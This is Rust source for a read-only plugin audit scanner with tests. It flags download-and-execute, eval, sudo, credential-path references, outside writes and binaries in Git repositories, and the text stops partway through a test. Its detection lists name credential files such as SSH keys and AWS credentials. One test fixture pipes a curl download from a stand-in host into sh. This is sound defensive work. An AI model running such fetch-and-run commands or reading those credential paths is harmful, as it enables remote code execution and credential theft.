//! Read-only heuristics over immutable Git objects, never plugin execution.
//! A clean scan means no known signals, not that executing the plugin is safe.

pub mod dependencies;

use std::collections::{BTreeMap, BTreeSet, VecDeque};
use std::io::Read;
use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::git::{Git, Mirror};
use crate::manifest::{Manifest, FILE_NAME};
use crate::util;

pub const RULE_IDS: &[&str] = &[
    "download-exec",
    "dynamic-exec",
    "privilege-escalation",
    "sensitive-path",
    "external-write",
    "execution-change",
    "script-change",
    "prebuilt-binary",
    "symlink",
    "submodule",
    "source-change",
    "dependency-vulnerability",
    "incomplete",
];
const RULES_VERSION: u32 = 1;
const MAX_BLOB: usize = 1024 * 1024;
const MAX_TOTAL: usize = 16 * 1024 * 1024;
const MAX_FILES: usize = 2048;
const MAX_TREE: usize = 4 * 1024 * 1024;
const MAX_ENTRIES: usize = 16384;
const MAX_CACHE: usize = 8 * 1024 * 1024;
const MAX_FINDINGS: usize = 4096;

#[derive(Clone, Debug, Default)]
pub struct Policy {
    pub allow_risks: Vec<String>,
    pub dependencies: bool,
}

impl Policy {
    pub fn validate(&self) -> Result<()> {
        for rule in &self.allow_risks {
            if !RULE_IDS.contains(&rule.as_str()) {
                bail!(
                    "unknown audit rule {}; permitted rules: {}",
                    util::sanitize(rule),
                    RULE_IDS.join(", ")
                );
            }
        }
        Ok(())
    }
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum Severity {
    Warning,
    High,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Finding {
    pub id: String,
    pub rule: String,
    pub severity: Severity,
    pub path: Option<String>,
    pub line: Option<usize>,
    pub message: String,
    pub is_new: bool,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct AuditReport {
    pub rules_version: u32,
    pub source: String,
    pub commit: String,
    pub subdir: Option<String>,
    pub platform: String,
    pub complete: bool,
    pub findings: Vec<Finding>,
    pub notes: Vec<String>,
    pub dependencies: Option<dependencies::DependencyReport>,
}

impl AuditReport {
    pub fn preview_lines(&self) -> Vec<String> {
        let mut lines = vec![format!(
            "  audit     {} (rules {})",
            self.status(),
            self.rules_version
        )];
        for finding in &self.findings {
            let location = finding
                .path
                .as_deref()
                .map(util::sanitize)
                .unwrap_or_default();
            let line = finding.line.map(|n| format!(":{n}")).unwrap_or_default();
            lines.push(format!(
                "    {} {} [{}] {}{}: {}",
                if finding.is_new { "NEW" } else { "existing" },
                util::sanitize(&finding.rule),
                match finding.severity {
                    Severity::Warning => "warning",
                    Severity::High => "high",
                },
                location,
                line,
                util::sanitize(&finding.message)
            ));
        }
        lines.extend(
            self.notes
                .iter()
                .map(|note| format!("    note: {}", util::sanitize(note))),
        );
        lines
    }

    pub fn status(&self) -> &'static str {
        if !self.complete {
            "incomplete"
        } else if !self.findings.is_empty() {
            "review-required"
        } else {
            "no-signals"
        }
    }

    pub fn exit_code(&self) -> u8 {
        match self.status() {
            "incomplete" => 3,
            "review-required" => 2,
            _ => 0,
        }
    }

    pub fn unapproved_rules(&self, allowed: &[String]) -> Vec<String> {
        let mut rules: BTreeSet<String> = self
            .findings
            .iter()
            .filter(|f| f.is_new)
            .map(|f| f.rule.clone())
            .collect();
        if !self.complete {
            rules.insert("incomplete".into());
        }
        rules.retain(|rule| !allowed.contains(rule));
        rules.into_iter().collect()
    }

    pub fn add_dependencies(&mut self, result: dependencies::DependencyReport) {
        // Advisory lookups are fresh, not compared to an indefinitely cached baseline.
        self.complete &= result.complete;
        self.findings.extend(result.findings.iter().cloned());
        self.notes.extend(result.notes.iter().cloned());
        self.dependencies = Some(result);
    }
}

pub fn enforce(report: &AuditReport, policy: &Policy, yes: bool, dry_run: bool) -> Result<()> {
    policy.validate()?;
    let missing = report.unapproved_rules(&policy.allow_risks);
    if !dry_run && yes && !missing.is_empty() {
        let approvals = missing
            .iter()
            .map(|rule| format!("--allow-risk {rule}"))
            .collect::<Vec<_>>()
            .join(" ");
        bail!("audit requires explicit risk approval before execution: {approvals} (--yes does not approve risks)");
    }
    // Interactive callers include this report in their existing complete review.
    Ok(())
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
struct Key {
    source: String,
    commit: String,
    subdir: Option<String>,
    platform: String,
    rules_version: u32,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
struct Scan {
    key: Key,
    complete: bool,
    findings: Vec<Finding>,
    notes: Vec<String>,
    // Only hashes: commands and source excerpts never enter durable reports.
    surface: BTreeMap<String, String>,
    executable: BTreeMap<String, String>,
    manifest_hash: String,
}

#[derive(Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
struct Cache {
    checksum: String,
    scan: Scan,
}

fn digest(parts: &[&[u8]]) -> String {
    let mut hash = Sha256::new();
    for part in parts {
        hash.update((part.len() as u64).to_le_bytes());
        hash.update(part);
    }
    let bytes = hash.finalize();
    let mut out = String::with_capacity(bytes.len() * 2);
    const HEX: &[u8; 16] = b"0123456789abcdef";
    for byte in bytes {
        out.push(HEX[(byte >> 4) as usize] as char);
        out.push(HEX[(byte & 15) as usize] as char);
    }
    out
}

fn fingerprint(rule: &str, path: Option<&str>, code: &str) -> String {
    let normalized = code.split_whitespace().collect::<Vec<_>>().join(" ");
    digest(&[
        rule.as_bytes(),
        path.unwrap_or("").as_bytes(),
        normalized.as_bytes(),
    ])
}

fn finding(
    rule: &str,
    severity: Severity,
    path: Option<&str>,
    line: Option<usize>,
    code: &str,
    message: &str,
) -> Finding {
    Finding {
        id: fingerprint(rule, path, code),
        rule: rule.into(),
        severity,
        path: path.map(str::to_owned),
        line,
        message: message.into(),
        is_new: true,
    }
}

fn valid_path(path: &str) -> bool {
    !path.is_empty()
        && !path.starts_with('/')
        && !path.contains(['\\', ':', '\0'])
        && path.split('/').all(|part| !matches!(part, "" | "." | ".."))
}

fn validate_input(commit: &str, subdir: Option<&str>) -> Result<()> {
    if !util::is_full_sha(commit) {
        bail!("audit requires an exact full Git commit SHA");
    }
    if subdir.is_some_and(|path| !valid_path(path) || path.chars().any(char::is_control)) {
        bail!("invalid audit plugin subdirectory");
    }
    Ok(())
}

fn manifest_path(subdir: Option<&str>) -> String {
    subdir
        .map(|dir| format!("{dir}/{FILE_NAME}"))
        .unwrap_or_else(|| FILE_NAME.into())
}

fn cache_path(root: &Path, key: &Key) -> PathBuf {
    let encoded = serde_json::to_vec(key).expect("audit key serialization");
    root.join(format!("{}.json", digest(&[&encoded])))
}

fn valid_scan(scan: &Scan, key: &Key) -> bool {
    scan.key == *key
        && scan.findings.len() <= MAX_FINDINGS
        && scan.executable.len() <= MAX_FILES
        && scan.surface.len() <= MAX_FILES
        && scan.notes.len() <= MAX_FINDINGS
        && scan.findings.iter().all(|f| {
            RULE_IDS.contains(&f.rule.as_str())
                && f.is_new
                && f.path.as_deref().is_none_or(valid_path)
                && f.id.len() == 64
                && f.id.bytes().all(|b| b.is_ascii_hexdigit())
        })
        && scan.executable.keys().all(|p| valid_path(p))
}

fn load_cache(path: &Path, key: &Key) -> Option<Scan> {
    let file = std::fs::File::open(path).ok()?;
    if file.metadata().ok()?.len() > MAX_CACHE as u64 {
        return None;
    }
    let mut bytes = Vec::new();
    file.take(MAX_CACHE as u64 + 1)
        .read_to_end(&mut bytes)
        .ok()?;
    if bytes.len() > MAX_CACHE {
        return None;
    }
    let cache: Cache = serde_json::from_slice(&bytes).ok()?;
    let encoded = serde_json::to_vec(&cache.scan).ok()?;
    (valid_scan(&cache.scan, key) && digest(&[&encoded]) == cache.checksum).then_some(cache.scan)
}

fn store_cache(path: &Path, scan: &Scan) {
    let Ok(encoded) = serde_json::to_vec(scan) else {
        return;
    };
    let cache = Cache {
        checksum: digest(&[&encoded]),
        scan: scan.clone(),
    };
    let Ok(bytes) = serde_json::to_vec(&cache) else {
        return;
    };
    if bytes.len() > MAX_CACHE {
        return;
    }
    if let Some(parent) = path.parent() {
        if std::fs::create_dir_all(parent).is_ok() {
            // Concurrent/partial writes are harmless: every read validates the envelope.
            let _ = std::fs::write(path, bytes);
        }
    }
}

pub fn inspect(
    git: Git,
    mirror: &Mirror,
    commit: &str,
    subdir: Option<&str>,
    manifest: &Manifest,
    previous: Option<&str>,
) -> Result<AuditReport> {
    let root = crate::paths::pm_home().join("cache").join("audit");
    inspect_with_cache(git, mirror, commit, subdir, manifest, previous, &root)
}

fn inspect_with_cache(
    git: Git,
    mirror: &Mirror,
    commit: &str,
    subdir: Option<&str>,
    manifest: &Manifest,
    previous: Option<&str>,
    cache: &Path,
) -> Result<AuditReport> {
    validate_input(commit, subdir)?;
    manifest.validate(None)?;
    if let Some(previous) = previous {
        validate_input(previous, subdir)?;
    }
    let key = Key {
        source: mirror.url.clone(),
        commit: commit.to_ascii_lowercase(),
        subdir: subdir.map(str::to_owned),
        platform: util::current_platform().into(),
        rules_version: RULES_VERSION,
    };
    let scan = technical_scan(git, mirror, &key, Some(manifest), cache)?;
    let mut report = AuditReport {
        rules_version: RULES_VERSION,
        source: mirror.url.clone(),
        commit: key.commit.clone(),
        subdir: key.subdir.clone(),
        platform: key.platform.clone(),
        complete: scan.complete,
        findings: scan.findings.clone(),
        notes: scan.notes.clone(),
        dependencies: None,
    };
    if let Some(previous) = previous {
        let baseline_key = Key {
            commit: previous.to_ascii_lowercase(),
            ..key
        };
        match technical_scan(git, mirror, &baseline_key, None, cache) {
            Ok(baseline) => {
                let old_ids: BTreeSet<&str> =
                    baseline.findings.iter().map(|f| f.id.as_str()).collect();
                for finding in &mut report.findings {
                    finding.is_new = !old_ids.contains(finding.id.as_str());
                }
                if !baseline.complete {
                    report.complete = false;
                    report.notes.push("Installed baseline could not be fully inspected; change comparison is incomplete.".into());
                }
                for (label, hash) in &scan.surface {
                    if baseline.surface.get(label) != Some(hash) {
                        report.findings.push(finding("execution-change", Severity::Warning, Some(&manifest_path(subdir)), None,
                            &format!("{label}:{hash}"), "An executable manifest entry was added or changed since the installed commit."));
                    }
                }
                for (path, hash) in &scan.executable {
                    if script_path(path) && baseline.executable.get(path) != Some(hash) {
                        report.findings.push(finding("script-change", Severity::Warning, Some(path), None, hash,
                            "A referenced script or build input was added or changed since the installed commit."));
                    }
                }
            }
            Err(_) => {
                report.complete = false;
                report.notes.push("Installed baseline is unavailable or invalid; all candidate signals require review.".into());
            }
        }
    }
    report
        .findings
        .sort_by(|a, b| (&a.path, a.line, &a.rule, &a.id).cmp(&(&b.path, b.line, &b.rule, &b.id)));
    Ok(report)
}

#[derive(Debug)]
struct Object {
    mode: String,
    oid: String,
    size: Option<usize>,
}

fn tree(git: Git, mirror: &Mirror, commit: &str) -> Result<BTreeMap<String, Object>> {
    let bytes = git.read_bounded(
        mirror,
        &["ls-tree", "-r", "-z", "-l", "--full-tree", commit],
        MAX_TREE,
    )?;
    let mut entries = BTreeMap::new();
    for record in bytes.split(|b| *b == 0).filter(|r| !r.is_empty()) {
        if entries.len() >= MAX_ENTRIES {
            bail!("audit tree entry limit exceeded");
        }
        let tab = record
            .iter()
            .position(|b| *b == b'\t')
            .context("invalid Git tree record")?;
        let header = std::str::from_utf8(&record[..tab])?;
        let path =
            std::str::from_utf8(&record[tab + 1..]).context("unsupported Git path encoding")?;
        if !valid_path(path) {
            bail!("unsupported Git tree path");
        }
        let fields: Vec<&str> = header.split_whitespace().collect();
        if fields.len() != 4 || !util::is_full_sha(fields[2]) {
            bail!("invalid Git tree metadata");
        }
        entries.insert(
            path.into(),
            Object {
                mode: fields[0].into(),
                oid: fields[2].into(),
                size: fields[3].parse().ok(),
            },
        );
    }
    Ok(entries)
}

fn blob(git: Git, mirror: &Mirror, object: &Object) -> Result<Vec<u8>> {
    if object.size.is_none_or(|n| n > MAX_BLOB) {
        bail!("audit blob size limit exceeded");
    }
    let bytes = git.read_bounded(mirror, &["cat-file", "blob", &object.oid], MAX_BLOB)?;
    if Some(bytes.len()) != object.size {
        bail!("Git object size mismatch");
    }
    Ok(bytes)
}

impl Scan {
    fn incomplete(&mut self, path: Option<&str>, reason: &str) {
        self.complete = false;
        self.push(finding(
            "incomplete",
            Severity::Warning,
            path,
            None,
            reason,
            reason,
        ));
    }

    fn push(&mut self, finding: Finding) {
        if self.findings.iter().any(|f| f.id == finding.id) {
            return;
        }
        if self.findings.len() < MAX_FINDINGS {
            self.findings.push(finding);
        } else {
            self.complete = false;
            if !self
                .notes
                .iter()
                .any(|n| n == "Finding limit reached; additional signals were not retained.")
            {
                self.notes
                    .push("Finding limit reached; additional signals were not retained.".into());
            }
        }
    }
}

fn technical_scan(
    git: Git,
    mirror: &Mirror,
    key: &Key,
    supplied: Option<&Manifest>,
    cache: &Path,
) -> Result<Scan> {
    let path = cache_path(cache, key);
    let supplied_hash = supplied
        .map(|m| serde_json::to_vec(m).map(|bytes| digest(&[&bytes])))
        .transpose()?;
    if let Some(scan) = load_cache(&path, key) {
        if supplied_hash
            .as_ref()
            .is_none_or(|hash| *hash == scan.manifest_hash)
        {
            return Ok(scan);
        }
        bail!("audit manifest does not match the selected immutable commit");
    }
    // Refuse trees/tags passed as a commit, even though ls-tree would accept them.
    let kind = git.read_bounded(mirror, &["cat-file", "-t", &key.commit], 32)?;
    if kind != b"commit\n" {
        bail!("audit object is not a Git commit");
    }
    let mut scan = Scan { key: key.clone(), complete: true, findings: Vec::new(), notes: vec![
        "Heuristic read-only scan: no signals is not a safety guarantee; generated outputs and runtime downloads are not inspected.".into()
    ], surface: BTreeMap::new(), executable: BTreeMap::new(), manifest_hash: String::new() };
    let entries = match tree(git, mirror, &key.commit) {
        Ok(entries) => entries,
        Err(_) => {
            scan.incomplete(None, "Repository tree could not be fully read within audit limits or contains unsupported paths.");
            // No durable clean result when a tree is uninspectable.
            return Ok(scan);
        }
    };
    let manifest_path = manifest_path(key.subdir.as_deref());
    let object = entries
        .get(&manifest_path)
        .context("selected plugin manifest is missing from the Git commit")?;
    if !matches!(object.mode.as_str(), "100644" | "100755") {
        bail!("selected plugin manifest is not a regular Git file");
    }
    let manifest_bytes =
        blob(git, mirror, object).context("could not inspect selected plugin manifest")?;
    let text =
        std::str::from_utf8(&manifest_bytes).context("selected plugin manifest is not UTF-8")?;
    let manifest = Manifest::parse(text).context("selected plugin manifest is malformed")?;
    manifest.validate(None)?;
    if supplied.is_some_and(|supplied| supplied != &manifest) {
        bail!("audit manifest does not match the selected immutable commit");
    }
    scan.manifest_hash = digest(&[&serde_json::to_vec(&manifest)?]);
    let base = key.subdir.as_deref().unwrap_or("");
    let mut active_refs = BTreeSet::new();
    let mut inactive_refs = BTreeSet::new();
    let mut queue = VecDeque::new();
    for runnable in manifest.runnables() {
        let refs = references(&runnable.command, base, &entries);
        if runnable.runs_here {
            if scan.surface.len() >= MAX_FILES {
                scan.incomplete(
                    Some(&manifest_path),
                    "Executable manifest entry count exceeds the audit limit.",
                );
                break;
            }
            scan.surface.insert(
                runnable.label.clone(),
                digest(&[runnable.command.as_bytes()]),
            );
            scan_text(&mut scan, &manifest_path, &runnable.command);
            for reference in refs {
                active_refs.insert(reference.clone());
                queue.push_back(reference);
            }
            missing_references(&mut scan, &runnable.command, base, &entries, &manifest_path);
        } else {
            inactive_refs.extend(refs);
        }
    }
    let nested: Vec<String> = entries
        .keys()
        .filter(|p| {
            *p != &manifest_path
                && p.ends_with(&format!("/{FILE_NAME}"))
                && (base.is_empty() || p.starts_with(&format!("{base}/")))
        })
        .filter_map(|p| p.rsplit_once('/').map(|(parent, _)| format!("{parent}/")))
        .collect();
    for (path, object) in &entries {
        let selected = base.is_empty() || path.starts_with(&format!("{base}/"));
        let sibling = nested.iter().any(|prefix| path.starts_with(prefix));
        let excluded_platform = inactive_refs.contains(path) && !active_refs.contains(path);
        if selected
            && !sibling
            && !excluded_platform
            && platform_file(path, &key.platform)
            && (relevant(path) || matches!(object.mode.as_str(), "100755" | "120000" | "160000"))
        {
            queue.push_back(path.clone());
        }
        if ancestor_input(path, base) {
            queue.push_back(path.clone());
        }
        // Checkout initializes all repository submodules, including siblings. Make
        // that unavoidable execution input visible rather than silently fetching.
        if object.mode == "160000" {
            queue.push_back(path.clone());
        }
    }
    let mut visited = BTreeSet::new();
    let mut total = manifest_bytes.len();
    while let Some(path) = queue.pop_front() {
        if path == manifest_path || !visited.insert(path.clone()) {
            continue;
        }
        if visited.len() > MAX_FILES {
            scan.incomplete(None, "Inspected file count exceeds the audit limit.");
            break;
        }
        let Some(object) = entries.get(&path) else {
            scan.incomplete(
                Some(&path),
                "Referenced executable input is missing from the Git tree.",
            );
            continue;
        };
        scan.executable.insert(
            path.clone(),
            digest(&[object.mode.as_bytes(), object.oid.as_bytes()]),
        );
        if object.mode == "160000" {
            scan.push(finding(
                "submodule",
                Severity::Warning,
                Some(&path),
                None,
                &object.oid,
                "Repository includes a submodule; its contents were not fetched or inspected.",
            ));
            scan.incomplete(
                Some(&path),
                "Submodule contents cannot be inspected from this repository's objects.",
            );
            continue;
        }
        if object.mode == "120000" {
            scan.push(finding(
                "symlink",
                Severity::Warning,
                Some(&path),
                None,
                &object.oid,
                "Executable scope contains a symlink; its target may escape the inspected tree.",
            ));
            scan.incomplete(
                Some(&path),
                "Symlink target content was not followed or inspected.",
            );
            continue;
        }
        if !matches!(object.mode.as_str(), "100644" | "100755") {
            scan.incomplete(
                Some(&path),
                "Unsupported Git object mode in executable scope.",
            );
            continue;
        }
        if object
            .size
            .is_none_or(|n| n > MAX_BLOB || total.saturating_add(n) > MAX_TOTAL)
        {
            scan.incomplete(
                Some(&path),
                "Executable input exceeds the per-file or total audit byte limit.",
            );
            continue;
        }
        let bytes = match blob(git, mirror, object) {
            Ok(bytes) => bytes,
            Err(_) => {
                scan.incomplete(
                    Some(&path),
                    "Executable input could not be read from Git objects.",
                );
                continue;
            }
        };
        total += bytes.len();
        let text = std::str::from_utf8(&bytes)
            .ok()
            .filter(|text| !text.contains('\0'));
        if text.is_none() || binary_extension(&path) {
            scan.push(finding(
                "prebuilt-binary",
                Severity::Warning,
                Some(&path),
                None,
                &object.oid,
                "A supplied executable or binary build input cannot be inspected as source text.",
            ));
            scan.incomplete(
                Some(&path),
                "Binary executable content cannot be inspected by the local text audit.",
            );
            continue;
        }
        let text = text.unwrap();
        scan_text(&mut scan, &path, text);
        let parent = path
            .rsplit_once('/')
            .map(|(parent, _)| parent)
            .unwrap_or("");
        // Scripts usually resolve paths from the plugin cwd; imports also resolve
        // relative to their containing file. Inspect both without executing either.
        for directory in [base, parent] {
            queue.extend(references(text, directory, &entries));
        }
    }
    scan.findings.sort_by(|a, b| a.id.cmp(&b.id));
    store_cache(&path, &scan);
    Ok(scan)
}

fn extension(path: &str) -> &str {
    path.rsplit_once('.').map(|(_, ext)| ext).unwrap_or("")
}

fn script_path(path: &str) -> bool {
    matches!(
        extension(path),
        "sh" | "bash"
            | "zsh"
            | "fish"
            | "ps1"
            | "psm1"
            | "bat"
            | "cmd"
            | "py"
            | "pyw"
            | "js"
            | "mjs"
            | "cjs"
            | "jsx"
            | "ts"
            | "tsx"
            | "rb"
            | "pl"
            | "lua"
            | "gradle"
    ) || matches!(
        path.rsplit('/').next().unwrap_or(path),
        "package.json"
            | "Cargo.toml"
            | "build.rs"
            | "Makefile"
            | "makefile"
            | "GNUmakefile"
            | "CMakeLists.txt"
            | "build.gradle"
            | "justfile"
            | ".npmrc"
    )
}

fn relevant(path: &str) -> bool {
    matches!(
        extension(path),
        "sh" | "bash"
            | "zsh"
            | "fish"
            | "ps1"
            | "psm1"
            | "bat"
            | "cmd"
            | "py"
            | "pyw"
            | "js"
            | "mjs"
            | "cjs"
            | "jsx"
            | "ts"
            | "tsx"
            | "rs"
            | "go"
            | "rb"
            | "pl"
            | "lua"
            | "c"
            | "h"
            | "cpp"
            | "cc"
            | "cs"
            | "swift"
            | "java"
            | "kt"
            | "gradle"
            | "exe"
            | "dll"
            | "so"
            | "dylib"
            | "wasm"
    ) || matches!(
        path.rsplit('/').next().unwrap_or(path),
        "package.json"
            | "Cargo.toml"
            | "Cargo.lock"
            | "package-lock.json"
            | "Makefile"
            | "makefile"
            | "GNUmakefile"
            | "CMakeLists.txt"
            | "build.gradle"
            | "justfile"
            | ".npmrc"
            | "config.toml"
    )
}

fn binary_extension(path: &str) -> bool {
    matches!(extension(path), "exe" | "dll" | "so" | "dylib" | "wasm")
}

fn platform_file(path: &str, platform: &str) -> bool {
    if matches!(
        extension(path),
        "ps1" | "psm1" | "bat" | "cmd" | "exe" | "dll"
    ) {
        return platform == "windows";
    }
    if matches!(extension(path), "sh" | "bash" | "zsh" | "fish" | "so") {
        return platform != "windows";
    }
    if extension(path) == "dylib" {
        return platform == "macos";
    }
    true
}

fn ancestor_input(path: &str, base: &str) -> bool {
    let (parent, name) = path.rsplit_once('/').unwrap_or(("", path));
    let ancestor = parent.is_empty() || base == parent || base.starts_with(&format!("{parent}/"));
    (ancestor
        && matches!(
            name,
            "Cargo.toml"
                | "Cargo.lock"
                | "package.json"
                | "package-lock.json"
                | "build.rs"
                | "Makefile"
                | "CMakeLists.txt"
                | "justfile"
                | ".npmrc"
        ))
        || (name == "config.toml" && parent.ends_with(".cargo") && {
            let workspace = parent
                .strip_suffix(".cargo")
                .unwrap_or("")
                .trim_end_matches('/');
            workspace.is_empty() || base == workspace || base.starts_with(&format!("{workspace}/"))
        })
}

fn resolve_path(base: &str, token: &str) -> Option<String> {
    let token = token
        .trim_matches(|c: char| matches!(c, '\'' | '"' | '`' | '(' | ')' | '[' | ']' | ',' | ';'));
    if token.is_empty()
        || token.contains(['$', '%', ':', '\0'])
        || token.starts_with(['/', '~', '-'])
    {
        return None;
    }
    let token = token.replace('\\', "/");
    let mut parts: Vec<&str> = base.split('/').filter(|p| !p.is_empty()).collect();
    for part in token.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            other => parts.push(other),
        }
    }
    let path = parts.join("/");
    valid_path(&path).then_some(path)
}

fn references(text: &str, base: &str, entries: &BTreeMap<String, Object>) -> BTreeSet<String> {
    let mut refs = BTreeSet::new();
    // Preserve quoted filenames with spaces, and inspect shell punctuation and
    // source-language string literals too. None of this parses or runs a shell.
    for word in util::split_words(text).into_iter().chain(
        text.split(|c: char| {
            c.is_whitespace() || matches!(c, '\'' | '"' | '`' | '(' | ')' | ';' | '|' | ',' | '=')
        })
        .map(str::to_owned),
    ) {
        if let Some(path) = resolve_path(base, &word) {
            if entries.contains_key(&path) {
                refs.insert(path);
            }
        }
    }
    refs
}

fn missing_references(
    scan: &mut Scan,
    command: &str,
    base: &str,
    entries: &BTreeMap<String, Object>,
    manifest_path: &str,
) {
    for word in util::split_words(command) {
        let token = word.trim_matches(['\'', '"']);
        let source_script = matches!(
            extension(token),
            "sh" | "bash"
                | "ps1"
                | "bat"
                | "cmd"
                | "py"
                | "js"
                | "mjs"
                | "cjs"
                | "ts"
                | "rb"
                | "pl"
        );
        if source_script && !token.contains(char::is_whitespace) && !token.contains("://") {
            if let Some(path) = resolve_path(base, token) {
                if !entries.contains_key(&path) {
                    scan.incomplete(Some(manifest_path), "A directly referenced script is missing from the Git tree (it may be generated at build time).");
                }
            } else if token.starts_with(['/', '~']) || token.contains("..") {
                scan.incomplete(
                    Some(manifest_path),
                    "A directly referenced script is outside the inspectable repository tree.",
                );
            }
        }
    }
}

fn scan_text(scan: &mut Scan, path: &str, text: &str) {
    let mut block_comment = false;
    let mut prior_download = false;
    for (index, original) in text.lines().enumerate() {
        let line = original.trim();
        if block_comment {
            if line.contains("*/") {
                block_comment = false;
            }
            continue;
        }
        if line.starts_with("/*") {
            block_comment = !line.contains("*/");
            continue;
        }
        if line.is_empty()
            || line.starts_with(['#', ';'])
            || line.starts_with("//")
            || line.starts_with("<!--")
        {
            continue;
        }
        let lower = line.to_ascii_lowercase();
        let words: Vec<&str> = lower
            .split(|c: char| !c.is_ascii_alphanumeric() && c != '_' && c != '-')
            .filter(|w| !w.is_empty())
            .collect();
        let has = |word: &str| words.contains(&word);
        let download = has("curl")
            || has("wget")
            || has("invoke-webrequest")
            || has("invoke-restmethod")
            || has("downloadstring")
            || has("downloadfile");
        let shell = [
            "sh",
            "bash",
            "zsh",
            "powershell",
            "pwsh",
            "iex",
            "invoke-expression",
        ]
        .iter()
        .any(|w| has(w));
        let launch = shell
            || lower.contains("chmod +x")
            || lower.contains("chmod u+x")
            || lower.starts_with("./")
            || lower.contains("start-process");
        let mut emit = |rule: &str, severity, message: &str| {
            scan.push(finding(
                rule,
                severity,
                Some(path),
                Some(index + 1),
                line,
                message,
            ));
        };
        if (download && (shell || has("exec") || has("eval"))) || (prior_download && launch) {
            emit(
                "download-exec",
                Severity::High,
                "Downloaded content is passed to or launched by a command interpreter.",
            );
        }
        if has("eval")
            || has("exec")
            || has("invoke-expression")
            || has("iex")
            || lower.contains("new function(")
            || lower.contains("-encodedcommand")
            || lower.contains("execsync(")
            || lower.contains("os.system(")
        {
            emit("dynamic-exec", Severity::High, "Dynamic evaluation or process execution can run code outside the declared command surface.");
        }
        if has("sudo")
            || has("doas")
            || has("pkexec")
            || lower.contains("-verb runas")
            || lower.contains("setuid(")
        {
            emit(
                "privilege-escalation",
                Severity::High,
                "Executable content requests elevated privileges or changes process identity.",
            );
        }
        if [
            ".ssh",
            "id_rsa",
            "id_ed25519",
            ".aws/credentials",
            ".aws\\credentials",
            ".netrc",
            ".npmrc",
            ".git-credentials",
            "login.keychain",
            "credentialmanager",
            "/etc/shadow",
            "localstorage/leveldb",
        ]
        .iter()
        .any(|needle| lower.contains(needle))
        {
            emit(
                "sensitive-path",
                Severity::High,
                "Executable content explicitly references a credential or sensitive key location.",
            );
        }
        let write = has("rm")
            || has("mv")
            || has("cp")
            || has("install")
            || has("tee")
            || has("set-content")
            || has("out-file")
            || has("remove-item")
            || has("writefile")
            || has("write_text")
            || lower.contains('>');
        let outside = [
            "/etc/",
            "/usr/",
            "/var/",
            "$home/",
            "${home}/",
            "~/",
            "%appdata%",
            "$env:appdata",
            "c:\\windows",
            "../",
        ]
        .iter()
        .any(|needle| lower.contains(needle));
        if write && outside {
            emit(
                "external-write",
                Severity::High,
                "A recognizable write or removal targets a path outside the plugin directory.",
            );
        }
        // Retain download context across adjacent commands, without storing code.
        prior_download =
            download || (prior_download && (line.ends_with('\\') || line.ends_with('`')));
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicU64, Ordering};
    static NEXT: AtomicU64 = AtomicU64::new(0);

    struct Repo {
        root: PathBuf,
        mirror: Mirror,
        cache: PathBuf,
    }
    impl Repo {
        fn new() -> Self {
            let root = std::env::temp_dir().join(format!(
                "hpm-audit-{}-{}",
                std::process::id(),
                NEXT.fetch_add(1, Ordering::Relaxed)
            ));
            std::fs::create_dir_all(&root).unwrap();
            let repo = Self {
                mirror: Mirror {
                    path: root.join("repo"),
                    url: "https://example.invalid/plugin.git".into(),
                },
                cache: root.join("cache"),
                root,
            };
            std::fs::create_dir_all(&repo.mirror.path).unwrap();
            repo.git(&["init", "--quiet"]);
            repo.git(&["config", "user.name", "Audit Test"]);
            repo.git(&["config", "user.email", "audit@example.invalid"]);
            repo
        }
        fn git(&self, args: &[&str]) -> String {
            Git::UNATTENDED
                .run(Some(&self.mirror.path), args, false)
                .unwrap()
        }
        fn put(&self, path: &str, bytes: impl AsRef<[u8]>) {
            let path = self.mirror.path.join(path);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, bytes).unwrap();
        }
        fn commit(&self) -> String {
            self.git(&["add", "."]);
            self.commit_staged()
        }
        fn commit_staged(&self) -> String {
            self.git(&[
                "-c",
                "core.hooksPath=",
                "commit",
                "--quiet",
                "--allow-empty",
                "-m",
                "fixture",
            ]);
            self.git(&["rev-parse", "HEAD"])
        }
        fn inspect(&self, sha: &str, subdir: Option<&str>, previous: Option<&str>) -> AuditReport {
            let path = manifest_path(subdir);
            let text = self.git(&["show", &format!("{sha}:{path}")]);
            let manifest = Manifest::parse(&text).unwrap();
            inspect_with_cache(
                Git::UNATTENDED,
                &self.mirror,
                sha,
                subdir,
                &manifest,
                previous,
                &self.cache,
            )
            .unwrap()
        }
    }
    impl Drop for Repo {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }
    fn manifest(command: &str) -> String {
        format!("id = 'audit.test'\nname = 'Audit Test'\nversion = '1.0.0'\nmin_herdr_version = '0.1.0'\n[[build]]\ncommand = ['sh', '{command}']\n")
    }
    fn rules(report: &AuditReport) -> Vec<&str> {
        report.findings.iter().map(|f| f.rule.as_str()).collect()
    }

    #[test]
    fn unchanged_manifest_still_detects_changed_script_and_blocks_yes() {
        let repo = Repo::new();
        repo.put(FILE_NAME, manifest("build.sh"));
        repo.put("build.sh", "echo hello\n");
        let old = repo.commit();
        repo.put("build.sh", "curl https://example.invalid/install | sh\n");
        let new = repo.commit();
        let report = repo.inspect(&new, None, Some(&old));
        assert!(rules(&report).contains(&"download-exec"));
        assert!(rules(&report).contains(&"script-change"));
        assert!(!rules(&report).contains(&"execution-change"));
        assert!(enforce(&report, &Policy::default(), true, false).is_err());
        assert!(enforce(&report, &Policy::default(), true, true).is_ok());
    }

    #[test]
    fn stable_identity_and_cached_baseline_delta_are_independent_of_lines() {
        let repo = Repo::new();
        repo.put(FILE_NAME, manifest("build.sh"));
        repo.put("build.sh", "sudo whoami\n");
        let old = repo.commit();
        repo.put("build.sh", "# inserted comment\n\nsudo whoami\n");
        let new = repo.commit();
        let initial = repo.inspect(&old, None, None);
        let fresh = repo.inspect(&new, None, None);
        let delta = repo.inspect(&new, None, Some(&old));
        let before = initial
            .findings
